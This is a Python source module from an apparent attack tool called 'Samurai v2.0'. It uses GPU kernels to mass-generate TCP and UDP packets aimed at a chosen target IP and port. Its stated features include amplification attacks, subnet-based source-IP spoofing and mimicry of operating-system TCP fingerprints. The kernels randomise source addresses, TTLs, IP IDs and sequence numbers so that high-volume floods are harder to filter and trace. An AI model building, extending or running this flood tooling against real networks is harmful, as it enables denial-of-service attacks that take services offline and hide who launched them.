"""GPU Packet Generation Module for Samurai v2.0

This module provides high-performance GPU-accelerated packet generation
using CUDA kernels via Numba and CuPy.

Features:
    - TCP/UDP/ICMP packet generation
    - IP fragmentation support
    - Amplification attack support
    - Template-based packet generation
    - Stateful connection tracking
    - TCP OS fingerprint mimicry
    - Subnet-based IP spoofing

Author: Samurai Team
"""

import numpy as np
import random
import logging
import threading
import time
import os
import hashlib
import ipaddress
from collections import OrderedDict
from typing import List, Optional, Tuple, Union

from numba import cuda, uint8, uint16, uint32, uint64, void, int64
from numba.cuda.random import xoroshiro128p_uniform_float32, create_xoroshiro128p_states
import cupy as cp

# ============================================================================
# Constants
# ============================================================================

# Layer 2
ETHERNET_HEADER_LEN = 14
MIN_ETHERNET_FRAME = 64  # Minimum Ethernet frame size (with padding)

# Layer 3 - IPv4
IP_HEADER_LEN = 20
IP_HEADER_MAX_LEN = 60  # With options
IP_VERSION_4 = 4

# Layer 3 - IPv6 (Future support)
IPV6_HEADER_LEN = 40
IP_VERSION_6 = 6

# Layer 4 - TCP
TCP_HEADER_LEN_NO_OPT = 20
TCP_OPTIONS_LEN = 20  # MSS(4) + SACK_PERM(2) + TS(10) + NOP(1) + WSCALE(3)
TCP_HEADER_LEN_WITH_OPT = 40

# Layer 4 - UDP
UDP_HEADER_LEN = 8

# Layer 4 - ICMP
ICMP_HEADER_LEN = 8
ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY = 0

# Protocol Numbers
TCP_PROTOCOL = 6
UDP_PROTOCOL = 17
ICMP_PROTOCOL = 1
ICMPV6_PROTOCOL = 58

# TCP Flags
TCP_FIN = 0x01
TCP_SYN = 0x02
TCP_RST = 0x04
TCP_PSH = 0x08
TCP_ACK = 0x10
TCP_URG = 0x20
TCP_ECE = 0x40
TCP_CWR = 0x80

# TCP Option Kinds
TCP_OPT_EOL = 0
TCP_OPT_NOP = 1
TCP_OPT_MSS = 2
TCP_OPT_WSCALE = 3
TCP_OPT_SACK_PERM = 4
TCP_OPT_SACK = 5
TCP_OPT_TIMESTAMP = 8

# Common TCP Window Sizes by OS
TCP_WINDOW_WINDOWS_10 = 64240
TCP_WINDOW_WINDOWS_7 = 65535
TCP_WINDOW_LINUX_4 = 29200
TCP_WINDOW_LINUX_5 = 65535
TCP_WINDOW_MACOS = 65535
TCP_WINDOW_FREEBSD = 32768

# Common TTL Values by OS
TTL_WINDOWS = 128
TTL_LINUX = 64
TTL_MACOS = 64
TTL_FREEBSD = 64
TTL_SOLARIS = 255
TTL_CISCO = 255

# ============================================================================
# Constant Memory (Global for module)
# P1 FIX #13: Template caching in __constant__ memory.
# Constant path is used only when data fits and upload succeeds; otherwise
# kernels fall back to global memory safely.
# ============================================================================
# Numba will place these in the .const segment
TEMPLATE_CONST_MAX = 4096
POOL_CONST_MAX = 32768
TEMPLATE_CONST_HOST = np.zeros(TEMPLATE_CONST_MAX, dtype=np.uint8)
POOL_CONST_HOST = np.zeros(POOL_CONST_MAX, dtype=np.uint8)
_CONST_UPDATE_AVAILABLE = None
_WARNED_TEMPLATE_CONST_FALLBACK = False
_WARNED_POOL_CONST_FALLBACK = False
_WARNED_POOL_CONST_STATEFUL_FALLBACK = False
_CONST_FINGERPRINTS = {
    "TEMPLATE_CONST_HOST": None,
    "POOL_CONST_HOST": None,
}

# Generation-path telemetry + caches
_generation_lock = threading.Lock()
_template_device_cache = OrderedDict()
_rng_state_pool = OrderedDict()
_generation_telemetry = {
    "gpu_template_h2d_copy_count": 0,
    "gpu_template_h2d_copy_bytes": 0,
    "gpu_rng_state_alloc_count": 0,
    "gpu_rng_state_reuse_count": 0,
    "gpu_template_cache_hit_count": 0,
    "gpu_template_cache_miss_count": 0,
}

def _can_use_constant_memory(total_bytes, constant_limit):
    return total_bytes <= constant_limit

def _const_payload_fingerprint(src: np.ndarray):
    src_bytes = src.tobytes(order="C")
    return (int(src.size), hash(src_bytes))

def _update_gpu_constant(symbol_name, host_data):
    """
    Update the backing host array used by cuda.const.array_like().

    Numba bakes constant-array bytes into kernel modules at compile time.
    Recompiling CUDA dispatchers to refresh constants is brittle across Numba
    versions, so this function avoids touching dispatcher internals. Constant
    memory is used when payload is unchanged; otherwise callers should fall
    back to the global-memory path.
    """
    global _CONST_UPDATE_AVAILABLE
    try:
        if symbol_name == "TEMPLATE_CONST_HOST":
            backing = TEMPLATE_CONST_HOST
            dispatchers = (template_kernel,)
        elif symbol_name == "POOL_CONST_HOST":
            backing = POOL_CONST_HOST
            dispatchers = (pool_kernel, stateful_pool_kernel)
        else:
            raise ValueError(f"Unknown constant symbol: {symbol_name}")

        src = np.asarray(host_data, dtype=np.uint8).ravel(order="A")
        if src.nbytes > backing.nbytes:
            _CONST_UPDATE_AVAILABLE = True
            return False

        new_fingerprint = _const_payload_fingerprint(src)
        old_fingerprint = _CONST_FINGERPRINTS.get(symbol_name)
        dispatchers_compiled = any(bool(getattr(disp, "overloads", None)) for disp in dispatchers)

        # If kernels are already compiled and payload changed, avoid unsafe
        # dispatcher cache mutation. Callers can use global-memory fallback.
        if dispatchers_compiled and old_fingerprint != new_fingerprint:
            _CONST_UPDATE_AVAILABLE = True
            return False

        if old_fingerprint == new_fingerprint:
            _CONST_UPDATE_AVAILABLE = True
            return True

        backing[:src.size] = src
        if src.size < backing.size:
            backing[src.size:] = 0
        _CONST_FINGERPRINTS[symbol_name] = new_fingerprint

        _CONST_UPDATE_AVAILABLE = True
        return True
    except Exception as e:
        _CONST_UPDATE_AVAILABLE = True
        logging.warning(f"Failed to update GPU Constant Memory '{symbol_name}', using global fallback: {e}")
        return False


def _env_int(name: str, default: int) -> int:
    try:
        return int(os.environ.get(name, str(default)) or default)
    except Exception:
        return int(default)


def _gpu_cache_limit() -> int:
    return max(0, _env_int("SAMURAI_GPU_CACHE_MAX_ENTRIES", 8))


def _rng_pool_limit() -> int:
    return max(0, _env_int("SAMURAI_GPU_RNG_POOL_MAX_ENTRIES", 8))


def _active_device_id() -> int:
    try:
        return int(cp.cuda.runtime.getDevice())
    except Exception:
        try:
            return int(cp.cuda.Device().id)
        except Exception:
            return -1


def _stream_cache_key(stream) -> str:
    if stream in (None, 0):
        return "default"
    ptr = getattr(stream, "ptr", None)
    if ptr is None:
        handle = getattr(stream, "handle", None)
        if handle is not None:
            ptr = getattr(handle, "value", None)
    if ptr is None:
        ptr = id(stream)
    try:
        return f"{int(ptr):x}"
    except Exception:
        return str(ptr)


def _template_digest(host_array: np.ndarray) -> str:
    view = np.ascontiguousarray(host_array).view(np.uint8)
    return hashlib.blake2b(view, digest_size=16, person=b"samurai_tpl").hexdigest()


def _telemetry_inc(key: str, value: int = 1) -> None:
    with _generation_lock:
        _generation_telemetry[key] = int(_generation_telemetry.get(key, 0) or 0) + int(value)


def get_generation_telemetry() -> dict:
    with _generation_lock:
        out = dict(_generation_telemetry)
        out["template_cache_entries"] = int(len(_template_device_cache))
        out["rng_pool_entries"] = int(len(_rng_state_pool))
        out["template_cache_limit"] = int(_gpu_cache_limit())
        out["rng_pool_limit"] = int(_rng_pool_limit())
    return out


def reset_generation_telemetry() -> None:
    with _generation_lock:
        for key in list(_generation_telemetry.keys()):
            _generation_telemetry[key] = 0


def clear_generation_caches() -> None:
    with _generation_lock:
        _template_device_cache.clear()
        _rng_state_pool.clear()


def _acquire_template_gpu(host_array: np.ndarray, packet_size: int):
    dev = _active_device_id()
    digest = _template_digest(host_array)
    key = (int(dev), str(digest), int(packet_size))
    limit = _gpu_cache_limit()

    if limit > 0:
        with _generation_lock:
            cached = _template_device_cache.get(key)
            if cached is not None:
                _template_device_cache.move_to_end(key, last=True)
                _generation_telemetry["gpu_template_cache_hit_count"] += 1
                return cached
            _generation_telemetry["gpu_template_cache_miss_count"] += 1
    else:
        _telemetry_inc("gpu_template_cache_miss_count", 1)

    try:
        template_gpu = cp.asarray(host_array)
    except Exception:
        # Test/mocked or limited CUDA-runtime environments may not support
        # direct asarray H2D; fall back to a more permissive constructor.
        try:
            template_gpu = cp.array(host_array, dtype=cp.uint8)
        except Exception:
            template_gpu = np.asarray(host_array, dtype=np.uint8)
    _telemetry_inc("gpu_template_h2d_copy_count", 1)
    _telemetry_inc("gpu_template_h2d_copy_bytes", int(host_array.nbytes))

    if limit > 0:
        with _generation_lock:
            _template_device_cache[key] = template_gpu
            while len(_template_device_cache) > limit:
                _template_device_cache.popitem(last=False)
    return template_gpu


def _acquire_rng_states(count: int, stream=None):
    count = max(1, int(count))
    dev = _active_device_id()
    skey = _stream_cache_key(stream)
    key = (int(dev), int(count), str(skey))
    limit = _rng_pool_limit()

    if limit > 0:
        with _generation_lock:
            cached = _rng_state_pool.get(key)
            if cached is not None:
                _rng_state_pool.move_to_end(key, last=True)
                _generation_telemetry["gpu_rng_state_reuse_count"] += 1
                return cached

    rng_states = create_xoroshiro128p_states(count, seed=random.randint(0, 0xFFFFFFFF))
    _telemetry_inc("gpu_rng_state_alloc_count", 1)

    if limit > 0:
        with _generation_lock:
            _rng_state_pool[key] = rng_states
            while len(_rng_state_pool) > limit:
                _rng_state_pool.popitem(last=False)
    return rng_states

@cuda.jit(device=True)
def calculate_checksum(buffer, offset, length):
    """
    Calculates 16-bit one's complement checksum.
    P1 FIX #12: Optimized with 32-bit read logic and loop unrolling.
    """
    checksum = 0
    # Sum 32-bit chunks (two 16-bit words each)
    num_chunks = length // 4
    for i in range(num_chunks):
        base = offset + (i * 4)
        # Read 4 bytes and form two 16-bit words (Big Endian)
        b0 = buffer[base]; b1 = buffer[base+1]; b2 = buffer[base+2]; b3 = buffer[base+3]
        checksum += (b0 << 8) | b1
        checksum += (b2 << 8) | b3
        
    # Handle remainder
    rem_offset = offset + (num_chunks * 4)
    remainder = length % 4
    if remainder >= 2:
        checksum += (buffer[rem_offset] << 8) | buffer[rem_offset + 1]
        if remainder == 3:
            checksum += (buffer[rem_offset + 2] << 8)
    elif remainder == 1:
        checksum += (buffer[rem_offset] << 8)
            
    # Fold 32-bit sum to 16 bits
    while (checksum >> 16):
        checksum = (checksum & 0xFFFF) + (checksum >> 16)
        
    return (~checksum) & 0xFFFF

@cuda.jit(device=True)
def read_uint16_be(buffer, offset):
    """Reads a 16-bit integer in Big Endian."""
    return (buffer[offset] << 8) | buffer[offset + 1]

@cuda.jit(device=True)
def read_uint32_be(buffer, offset):
    """Reads a 32-bit integer in Big Endian."""
    return (buffer[offset] << 24) | (buffer[offset + 1] << 16) | (buffer[offset + 2] << 8) | buffer[offset + 3]

@cuda.jit(device=True)
def fold_ones_complement(sum32):
    """Fold a running checksum sum to 16 bits."""
    acc = int64(sum32) & 0xFFFFFFFF
    while (acc >> 16) > 0:
        acc = (acc & 0xFFFF) + (acc >> 16)
    return acc & 0xFFFF

@cuda.jit(device=True)
def rfc1624_update_word(old_checksum, old_word, new_word):
    """
    RFC 1624 incremental checksum update for a single 16-bit word:
    HC' = ~(~HC + ~m + m')
    """
    old_c = int64(old_checksum) & 0xFFFF
    old_w = int64(old_word) & 0xFFFF
    new_w = int64(new_word) & 0xFFFF
    sum32 = (old_c ^ 0xFFFF) + (old_w ^ 0xFFFF) + new_w
    sum32 = fold_ones_complement(sum32)
    return (sum32 ^ 0xFFFF) & 0xFFFF

@cuda.jit(device=True)
def rfc1624_update_dword(old_checksum, old_dword, new_dword):
    """RFC 1624 update for a 32-bit field (two 16-bit words)."""
    csum16 = int64(old_checksum) & 0xFFFF
    old32 = int64(old_dword) & 0xFFFFFFFF
    new32 = int64(new_dword) & 0xFFFFFFFF
    csum = rfc1624_update_word(csum16, (old32 >> 16) & 0xFFFF, (new32 >> 16) & 0xFFFF)
    csum = rfc1624_update_word(csum, old32 & 0xFFFF, new32 & 0xFFFF)
    return csum

@cuda.jit(device=True)
def calculate_pseudo_header_sum(src_ip, dst_ip, protocol, length):
    """
    Calculates the sum of the Pseudo Header for TCP/UDP checksums.
    Pseudo Header Structure:
      Src IP (32 bits)
      Dst IP (32 bits)
      Reserved (8 bits) = 0
      Protocol (8 bits)
      Length (16 bits)
    """
    checksum = 0
    
    # Source IP (2 words)
    checksum += (src_ip >> 16) & 0xFFFF
    checksum += src_ip & 0xFFFF
    
    # Dest IP (2 words)
    checksum += (dst_ip >> 16) & 0xFFFF
    checksum += dst_ip & 0xFFFF
    
    # Reserved (0) + Protocol
    # In Big Endian, this is 0x00 <Proto> -> just the protocol value
    checksum += protocol
    
    # Length
    checksum += length
    
    return checksum

@cuda.jit(device=True)
def calculate_tcp_checksum_optimized(buffer, offset, length, src_ip, dst_ip):
    """
    Calculates TCP checksum with pseudo-header.
    P1 FIX #12: Optimized with 32-bit read logic.
    """
    checksum = calculate_pseudo_header_sum(src_ip, dst_ip, TCP_PROTOCOL, length)
    
    # Sum TCP header and data in 32-bit chunks
    num_chunks = length // 4
    for i in range(num_chunks):
        base = offset + (i * 4)
        b0 = buffer[base]; b1 = buffer[base+1]; b2 = buffer[base+2]; b3 = buffer[base+3]
        checksum += (b0 << 8) | b1
        checksum += (b2 << 8) | b3
        
    rem_offset = offset + (num_chunks * 4)
    remainder = length % 4
    if remainder >= 2:
        checksum += (buffer[rem_offset] << 8) | buffer[rem_offset + 1]
        if remainder == 3:
            checksum += (buffer[rem_offset + 2] << 8)
    elif remainder == 1:
        checksum += (buffer[rem_offset] << 8)
    
    while (checksum >> 16):
        checksum = (checksum & 0xFFFF) + (checksum >> 16)
    
    return (~checksum) & 0xFFFF

@cuda.jit(device=True)
def calculate_udp_checksum_optimized(buffer, offset, length, src_ip, dst_ip):
    """
    Calculates UDP checksum with pseudo-header.
    P1 FIX #12: Optimized with 32-bit read logic.
    """
    checksum = calculate_pseudo_header_sum(src_ip, dst_ip, UDP_PROTOCOL, length)
    
    num_chunks = length // 4
    for i in range(num_chunks):
        base = offset + (i * 4)
        b0 = buffer[base]; b1 = buffer[base+1]; b2 = buffer[base+2]; b3 = buffer[base+3]
        checksum += (b0 << 8) | b1
        checksum += (b2 << 8) | b3
        
    rem_offset = offset + (num_chunks * 4)
    remainder = length % 4
    if remainder >= 2:
        checksum += (buffer[rem_offset] << 8) | buffer[rem_offset + 1]
        if remainder == 3:
            checksum += (buffer[rem_offset + 2] << 8)
    elif remainder == 1:
        checksum += (buffer[rem_offset] << 8)
    
    while (checksum >> 16):
        checksum = (checksum & 0xFFFF) + (checksum >> 16)
    
    # UDP checksum 0 means disabled, but if calculated is 0, must be 0xFFFF
    res = (~checksum) & 0xFFFF
    if res == 0:
        return 0xFFFF
    return res

@cuda.jit(device=True)
def calculate_icmp_checksum(buffer, offset, length):
    """
    Calculates ICMP checksum.
    ICMP checksum covers the entire ICMP message (header + data).
    No pseudo-header is used (unlike TCP/UDP).
    """
    checksum = 0
    
    # Sum in 16-bit words
    num_words = length // 2
    for i in range(num_words):
        base = offset + (i * 2)
        word = (buffer[base] << 8) | buffer[base + 1]
        checksum += word
    
    # Handle odd byte
    if length % 2 == 1:
        checksum += buffer[offset + length - 1] << 8
    
    # Fold 32-bit sum to 16 bits
    while (checksum >> 16) > 0:
        checksum = (checksum & 0xFFFF) + (checksum >> 16)
    
    return (~checksum) & 0xFFFF

@cuda.jit(device=True)
def calculate_tcp_checksum_from_header_and_payload(packet_buffer, tcp_offset, tcp_header_len,
                                                   payload_buffer, payload_size, payload_total_len,
                                                   src_ip, dst_ip):
    """
    Calculate TCP checksum for fragmented generation where payload bytes are split
    across fragments but stored contiguously in payload_buffer.
    """
    checksum = calculate_pseudo_header_sum(
        src_ip, dst_ip, TCP_PROTOCOL, tcp_header_len + payload_total_len
    )

    # TCP header (checksum field must already be zeroed in packet_buffer)
    for i in range(0, tcp_header_len, 2):
        checksum += (packet_buffer[tcp_offset + i] << 8) | packet_buffer[tcp_offset + i + 1]

    # TCP payload bytes (missing bytes are treated as explicit zero padding)
    for i in range(0, payload_total_len, 2):
        b0 = payload_buffer[i] if i < payload_size else 0
        if i + 1 < payload_total_len:
            b1 = payload_buffer[i + 1] if i + 1 < payload_size else 0
            checksum += (b0 << 8) | b1
        else:
            checksum += (b0 << 8)

    while (checksum >> 16):
        checksum = (checksum & 0xFFFF) + (checksum >> 16)
    return (~checksum) & 0xFFFF

@cuda.jit(device=True)
def calculate_checksum_warp(buffer, offset, length):
    """
    P1 FIX #11: Warp-level Checksum Reduction.
    Uses all 32 threads in a warp to collaboratively calculate checksum.
    Significantly faster for large packets (Viper/Fragmentation mode).
    """
    lane_id = cuda.threadIdx.x % 32
    checksum = 0
    
    # Each thread sums a portion of the buffer
    # We use 32-bit reads for speed
    num_uint32 = length // 4
    for i in range(lane_id, num_uint32, 32):
        base = offset + (i * 4)
        # Read 4 bytes
        b0 = buffer[base]; b1 = buffer[base+1]; b2 = buffer[base+2]; b3 = buffer[base+3]
        checksum += (b0 << 8) | b1
        checksum += (b2 << 8) | b3
        
    # Handle remainder (only lane 0 handles it for simplicity, or we could distribute)
    if lane_id == 0:
        rem_start = num_uint32 * 4
        remainder = length % 4
        if remainder >= 2:
            checksum += (buffer[offset + rem_start] << 8) | buffer[offset + rem_start + 1]
            if remainder == 3:
                checksum += (buffer[offset + rem_start + 2] << 8)
        elif remainder == 1:
            checksum += (buffer[offset + rem_start] << 8)
            
    # Warp Reduction using shfl_down_sync
    # We need to reduce the 32 partial sums
    mask = 0xFFFFFFFF
    for delta in [16, 8, 4, 2, 1]:
        checksum += cuda.shfl_down_sync(mask, checksum, delta)
        
    # Lane 0 now has the total sum
    # Fold into 16 bits
    if lane_id == 0:
        while (checksum >> 16) > 0:
            checksum = (checksum & 0xFFFF) + (checksum >> 16)
        return (~checksum) & 0xFFFF
    return 0 # Only lane 0 result is valid

@cuda.jit(device=True)
def write_uint32_be(buffer, offset, value):
    """Writes a 32-bit integer in Big Endian."""
    buffer[offset] = (value >> 24) & 0xFF
    buffer[offset + 1] = (value >> 16) & 0xFF
    buffer[offset + 2] = (value >> 8) & 0xFF
    buffer[offset + 3] = value & 0xFF

@cuda.jit(device=True)
def write_uint16_be(buffer, offset, value):
    """Writes a 16-bit integer in Big Endian."""
    buffer[offset] = (value >> 8) & 0xFF
    buffer[offset + 1] = value & 0xFF

@cuda.jit(device=True)
def fast_memcpy_aligned(dst_buffer, dst_offset, src_buffer, src_offset, length):
    """
    P1 FIX #6: Optimized memory copy using 32-bit aligned reads/writes.
    ~10x faster than byte-by-byte copy for aligned data.
    
    Copies 4 bytes at a time for aligned portion, then handles remainder.
    """
    # Use uint32 destination stores when destination is 4-byte aligned.
    if (dst_offset & 0x3) == 0 and length >= 4:
        dst_u32 = dst_buffer.view(np.uint32)
        word_dst = dst_offset >> 2
        num_uint32 = length // 4

        for i in range(num_uint32):
            byte_idx = i * 4
            # Pack source bytes in little-endian word order
            val = (src_buffer[src_offset + byte_idx]) | \
                  (src_buffer[src_offset + byte_idx + 1] << 8) | \
                  (src_buffer[src_offset + byte_idx + 2] << 16) | \
                  (src_buffer[src_offset + byte_idx + 3] << 24)
            dst_u32[word_dst + i] = val

        remainder = length % 4
        remainder_start = num_uint32 * 4
        for i in range(remainder):
            dst_buffer[dst_offset + remainder_start + i] = src_buffer[src_offset + remainder_start + i]
    else:
        # Fallback for unaligned destinations.
        for i in range(length):
            dst_buffer[dst_offset + i] = src_buffer[src_offset + i]

@cuda.jit(device=True)
def read_uint32_le(buffer, offset):
    """Read 4 bytes as little-endian 32-bit integer."""
    return (buffer[offset]) | \
           (buffer[offset + 1] << 8) | \
           (buffer[offset + 2] << 16) | \
           (buffer[offset + 3] << 24)

@cuda.jit(device=True)
def write_uint32_le(buffer, offset, value):
    """Write 32-bit integer as little-endian (native GPU format)."""
    buffer[offset] = value & 0xFF
    buffer[offset + 1] = (value >> 8) & 0xFF
    buffer[offset + 2] = (value >> 16) & 0xFF
    buffer[offset + 3] = (value >> 24) & 0xFF

@cuda.jit(device=True)
def _select_tcp_window(user_tcp_window, rng_states, idx):
    if user_tcp_window >= 0:
        return user_tcp_window
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    os_selector = int(rand_tmp * 6)
    if os_selector == 0:
        return 64240
    elif os_selector == 1:
        return 65535
    elif os_selector == 2:
        return 29200
    elif os_selector == 3:
        return 65535
    elif os_selector == 4:
        return 65535
    return 32768

@cuda.jit(device=True)
def _write_l2_l3_ipv4_header(packets_buffer, packet_offset, has_ethernet, gateway_mac, ip_total_len, ip_id, ip_ttl, protocol, src_ip_int, target_ip_int):
    current_offset = packet_offset
    if has_ethernet == 1:
        packets_buffer[current_offset] = (gateway_mac >> 40) & 0xFF
        packets_buffer[current_offset + 1] = (gateway_mac >> 32) & 0xFF
        packets_buffer[current_offset + 2] = (gateway_mac >> 24) & 0xFF
        packets_buffer[current_offset + 3] = (gateway_mac >> 16) & 0xFF
        packets_buffer[current_offset + 4] = (gateway_mac >> 8) & 0xFF
        packets_buffer[current_offset + 5] = gateway_mac & 0xFF
        write_uint32_be(packets_buffer, current_offset + 6, 0x00000000)
        write_uint16_be(packets_buffer, current_offset + 10, 0x0000)
        write_uint16_be(packets_buffer, current_offset + 12, 0x0800)
        current_offset += ETHERNET_HEADER_LEN

    ip_offset = current_offset
    write_uint16_be(packets_buffer, ip_offset, 0x4500)
    write_uint16_be(packets_buffer, ip_offset + 2, ip_total_len)
    write_uint16_be(packets_buffer, ip_offset + 4, ip_id)
    write_uint16_be(packets_buffer, ip_offset + 6, 0)
    packets_buffer[ip_offset + 8] = ip_ttl
    packets_buffer[ip_offset + 9] = protocol
    write_uint16_be(packets_buffer, ip_offset + 10, 0)
    write_uint32_be(packets_buffer, ip_offset + 12, src_ip_int)
    write_uint32_be(packets_buffer, ip_offset + 16, target_ip_int)
    ip_csum = calculate_checksum(packets_buffer, ip_offset, 20)
    write_uint16_be(packets_buffer, ip_offset + 10, ip_csum)

@cuda.jit
def create_tcp_packets_kernel_spoof(packets_buffer, count, target_ip_int, target_port, tcp_flags_int, has_ethernet, user_tcp_window, rng_states, gateway_mac, spoof_base_ip, spoof_mask):
    idx = cuda.grid(1)
    if idx >= count:
        return

    transport_len = TCP_HEADER_LEN_WITH_OPT
    packet_size = (14 if has_ethernet else 0) + 20 + transport_len
    packet_offset = idx * packet_size

    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    src_ip_int = spoof_base_ip + int(rand_tmp * ((1 << (32 - spoof_mask)) - 1))
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    ip_ttl = 48 + int(rand_tmp * 81)
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    ip_id = int(rand_tmp * 65535)
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    tcp_seq = int(rand_tmp * 0xFFFFFFFF)

    tcp_window = _select_tcp_window(user_tcp_window, rng_states, idx)
    _write_l2_l3_ipv4_header(
        packets_buffer, packet_offset, has_ethernet, gateway_mac, 20 + transport_len, ip_id, ip_ttl,
        TCP_PROTOCOL, src_ip_int, target_ip_int
    )

    transport_offset = packet_offset + (14 if has_ethernet else 0) + 20
    src_port = 1024 + (idx % 64512)
    write_uint16_be(packets_buffer, transport_offset, src_port)
    write_uint16_be(packets_buffer, transport_offset + 2, target_port)
    write_uint32_be(packets_buffer, transport_offset + 4, tcp_seq)
    write_uint32_be(packets_buffer, transport_offset + 8, 0)
    packets_buffer[transport_offset + 12] = 0xA0
    packets_buffer[transport_offset + 13] = tcp_flags_int
    write_uint16_be(packets_buffer, transport_offset + 14, tcp_window)
    write_uint16_be(packets_buffer, transport_offset + 16, 0)
    write_uint16_be(packets_buffer, transport_offset + 18, 0)

    opt_offset = transport_offset + 20
    mss_val = 1380 + (idx % 81)
    packets_buffer[opt_offset] = 2; packets_buffer[opt_offset + 1] = 4
    write_uint16_be(packets_buffer, opt_offset + 2, mss_val)
    packets_buffer[opt_offset + 4] = 4; packets_buffer[opt_offset + 5] = 2
    rand_ts = xoroshiro128p_uniform_float32(rng_states, idx)
    ts_val = int(rand_ts * 0xFFFFFFFF)
    packets_buffer[opt_offset + 6] = 8; packets_buffer[opt_offset + 7] = 10
    write_uint32_be(packets_buffer, opt_offset + 8, ts_val)
    write_uint32_be(packets_buffer, opt_offset + 12, 0)
    packets_buffer[opt_offset + 16] = 1
    packets_buffer[opt_offset + 17] = 3; packets_buffer[opt_offset + 18] = 3; packets_buffer[opt_offset + 19] = 7

    tcp_csum = calculate_tcp_checksum_optimized(packets_buffer, transport_offset, transport_len, src_ip_int, target_ip_int)
    write_uint16_be(packets_buffer, transport_offset + 16, tcp_csum)

@cuda.jit
def create_tcp_packets_kernel_nospoof(packets_buffer, count, target_ip_int, target_port, real_src_ip_int, tcp_flags_int, has_ethernet, user_tcp_window, rng_states, gateway_mac):
    idx = cuda.grid(1)
    if idx >= count:
        return

    transport_len = TCP_HEADER_LEN_WITH_OPT
    packet_size = (14 if has_ethernet else 0) + 20 + transport_len
    packet_offset = idx * packet_size

    src_ip_int = real_src_ip_int
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    ip_ttl = 48 + int(rand_tmp * 81)
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    ip_id = int(rand_tmp * 65535)
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    tcp_seq = int(rand_tmp * 0xFFFFFFFF)

    tcp_window = _select_tcp_window(user_tcp_window, rng_states, idx)
    _write_l2_l3_ipv4_header(
        packets_buffer, packet_offset, has_ethernet, gateway_mac, 20 + transport_len, ip_id, ip_ttl,
        TCP_PROTOCOL, src_ip_int, target_ip_int
    )

    transport_offset = packet_offset + (14 if has_ethernet else 0) + 20
    src_port = 1024 + (idx % 64512)
    write_uint16_be(packets_buffer, transport_offset, src_port)
    write_uint16_be(packets_buffer, transport_offset + 2, target_port)
    write_uint32_be(packets_buffer, transport_offset + 4, tcp_seq)
    write_uint32_be(packets_buffer, transport_offset + 8, 0)
    packets_buffer[transport_offset + 12] = 0xA0
    packets_buffer[transport_offset + 13] = tcp_flags_int
    write_uint16_be(packets_buffer, transport_offset + 14, tcp_window)
    write_uint16_be(packets_buffer, transport_offset + 16, 0)
    write_uint16_be(packets_buffer, transport_offset + 18, 0)

    opt_offset = transport_offset + 20
    mss_val = 1380 + (idx % 81)
    packets_buffer[opt_offset] = 2; packets_buffer[opt_offset + 1] = 4
    write_uint16_be(packets_buffer, opt_offset + 2, mss_val)
    packets_buffer[opt_offset + 4] = 4; packets_buffer[opt_offset + 5] = 2
    rand_ts = xoroshiro128p_uniform_float32(rng_states, idx)
    ts_val = int(rand_ts * 0xFFFFFFFF)
    packets_buffer[opt_offset + 6] = 8; packets_buffer[opt_offset + 7] = 10
    write_uint32_be(packets_buffer, opt_offset + 8, ts_val)
    write_uint32_be(packets_buffer, opt_offset + 12, 0)
    packets_buffer[opt_offset + 16] = 1
    packets_buffer[opt_offset + 17] = 3; packets_buffer[opt_offset + 18] = 3; packets_buffer[opt_offset + 19] = 7

    tcp_csum = calculate_tcp_checksum_optimized(packets_buffer, transport_offset, transport_len, src_ip_int, target_ip_int)
    write_uint16_be(packets_buffer, transport_offset + 16, tcp_csum)

@cuda.jit
def create_udp_packets_kernel_spoof(packets_buffer, count, target_ip_int, target_port, has_ethernet, rng_states, gateway_mac, spoof_base_ip, spoof_mask):
    idx = cuda.grid(1)
    if idx >= count:
        return

    transport_len = UDP_HEADER_LEN
    packet_size = (14 if has_ethernet else 0) + 20 + transport_len
    packet_offset = idx * packet_size

    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    src_ip_int = spoof_base_ip + int(rand_tmp * ((1 << (32 - spoof_mask)) - 1))
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    ip_ttl = 48 + int(rand_tmp * 81)
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    ip_id = int(rand_tmp * 65535)

    _write_l2_l3_ipv4_header(
        packets_buffer, packet_offset, has_ethernet, gateway_mac, 20 + transport_len, ip_id, ip_ttl,
        UDP_PROTOCOL, src_ip_int, target_ip_int
    )

    transport_offset = packet_offset + (14 if has_ethernet else 0) + 20
    src_port = 1024 + (idx % 64512)
    write_uint16_be(packets_buffer, transport_offset, src_port)
    write_uint16_be(packets_buffer, transport_offset + 2, target_port)
    write_uint16_be(packets_buffer, transport_offset + 4, transport_len)
    write_uint16_be(packets_buffer, transport_offset + 6, 0)
    udp_csum = calculate_udp_checksum_optimized(packets_buffer, transport_offset, transport_len, src_ip_int, target_ip_int)
    write_uint16_be(packets_buffer, transport_offset + 6, udp_csum)

@cuda.jit
def create_udp_packets_kernel_nospoof(packets_buffer, count, target_ip_int, target_port, real_src_ip_int, has_ethernet, rng_states, gateway_mac):
    idx = cuda.grid(1)
    if idx >= count:
        return

    transport_len = UDP_HEADER_LEN
    packet_size = (14 if has_ethernet else 0) + 20 + transport_len
    packet_offset = idx * packet_size

    src_ip_int = real_src_ip_int
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    ip_ttl = 48 + int(rand_tmp * 81)
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    ip_id = int(rand_tmp * 65535)

    _write_l2_l3_ipv4_header(
        packets_buffer, packet_offset, has_ethernet, gateway_mac, 20 + transport_len, ip_id, ip_ttl,
        UDP_PROTOCOL, src_ip_int, target_ip_int
    )

    transport_offset = packet_offset + (14 if has_ethernet else 0) + 20
    src_port = 1024 + (idx % 64512)
    write_uint16_be(packets_buffer, transport_offset, src_port)
    write_uint16_be(packets_buffer, transport_offset + 2, target_port)
    write_uint16_be(packets_buffer, transport_offset + 4, transport_len)
    write_uint16_be(packets_buffer, transport_offset + 6, 0)
    udp_csum = calculate_udp_checksum_optimized(packets_buffer, transport_offset, transport_len, src_ip_int, target_ip_int)
    write_uint16_be(packets_buffer, transport_offset + 6, udp_csum)

